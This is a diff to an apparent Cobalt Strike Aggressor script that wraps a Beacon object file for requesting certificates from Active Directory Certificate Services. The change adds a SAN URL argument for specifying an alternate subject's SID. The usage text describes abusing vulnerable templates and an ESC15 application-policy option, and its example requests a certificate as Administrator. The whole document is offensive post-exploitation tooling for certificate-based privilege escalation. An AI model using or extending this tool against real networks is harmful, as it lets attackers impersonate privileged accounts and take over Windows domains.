@@ -1658,7 +1658,7 @@ beacon_command_register(
 );
 
 alias adcs_request {
-	local('$params $keys $args $adcs_request_ca $adcs_request_template $adcs_request_subject $adcs_request_altname $adcs_request_install $adcs_request_machine $app_policy');
+	local('$params $keys $args $adcs_request_ca $adcs_request_template $adcs_request_subject $adcs_request_altname $adcs_request_alturl $adcs_request_install $adcs_request_machine $app_policy');
 
     if(size(@_) < 2)
     {
@@ -1672,6 +1672,7 @@ alias adcs_request {
 	$adcs_request_template = "";
 	$adcs_request_subject = "";
 	$adcs_request_altname = "";
+	$adcs_request_alturl = "";
 	$adcs_request_install = 0;
 	$adcs_request_machine = 0;
     $app_policy = 0;
@@ -1681,12 +1682,13 @@ alias adcs_request {
 	$adcs_request_template = iff(-istrue $3, $3, "");
     $adcs_request_subject = iff(-istrue $4, $4, "");
     $adcs_request_altname = iff(-istrue $5, $5, "");
-    $adcs_request_install = iff(-istrue $6, $6, 0);
-    $adcs_request_machine = iff(-istrue $7, $7, 0);
-    $app_policy = iff(-istrue $8, $8, 0);
-    $dns = iff(-istrue $9, $9, 0);
+    $adcs_request_alturl = iff(-istrue $6, $6, "");
+    $adcs_request_install = iff(-istrue $7, $7, 0);
+    $adcs_request_machine = iff(-istrue $8, $8, 0);
+    $app_policy = iff(-istrue $9, $9, 0);
+    $dns = iff(-istrue $10, $10, 0);
 
-	$args = bof_pack($1, "ZZZZssss", $adcs_request_ca, $adcs_request_template, $adcs_request_subject, $adcs_request_altname, $adcs_request_install, $adcs_request_machine, $app_policy, $dns);
+	$args = bof_pack($1, "ZZZZZssss", $adcs_request_ca, $adcs_request_template, $adcs_request_subject, $adcs_request_altname, $adcs_request_alturl, $adcs_request_install, $adcs_request_machine, $app_policy, $dns);
 	beacon_inline_execute($1, readbof($1, "adcs_request"), "go", $args);
 }
 
@@ -1703,6 +1705,7 @@ Usage:   adcs_request CA [opt:TEMPLATE] [opt:SUBJECT] [opt: ALTNAME] [opt: INSTA
          TEMPLATE  Optional. The certificate type to request. Use \"\" for default of User/Machine
          SUBJECT   Optional. The subject's distinguished name. Use \"\" for default of current machine / user
          ALTNAME   Optional. The alternate subject's distinguished name. Use \"\" for default
+         ALTURL    Optional. SAN URL entry, can be used to specify the alternate subject's SID. Use \"\" to omit
          INSTALL   Optional. Install the certificate in current context? 0 = No, 1 = Yes. Default = 0
          MACHINE   Optional. Request a certificate for a machine instead of a user? 0 = No, 1 = Yes. Default = 0
          ADD_APP_POLICY Optional. Adds App policy to allow client auth and Acting as a certificate agent. (ESC15)
@@ -1716,7 +1719,7 @@ basic:
     adcs_request cert.example.org\\example-CERT-CA 
 
 all options:
-    adcs_request cert.example.org\\example-CERT-CA vulnTemplate CN=Administrator,CN=Users,DC=example,DC=org CN=second_adm,CN=Users,DC=example,DC=org 0 0
+    adcs_request cert.example.org\\example-CERT-CA vulnTemplate CN=Administrator,CN=Users,DC=example,DC=org CN=second_adm,CN=Users,DC=example,DC=org tag:microsoft.com,2022-09-14:sid:S-1-5-21-3006160104-3291460162-27467737-1123 0 0 0 0
 
 use quotes for any arguments with spaces.
 "
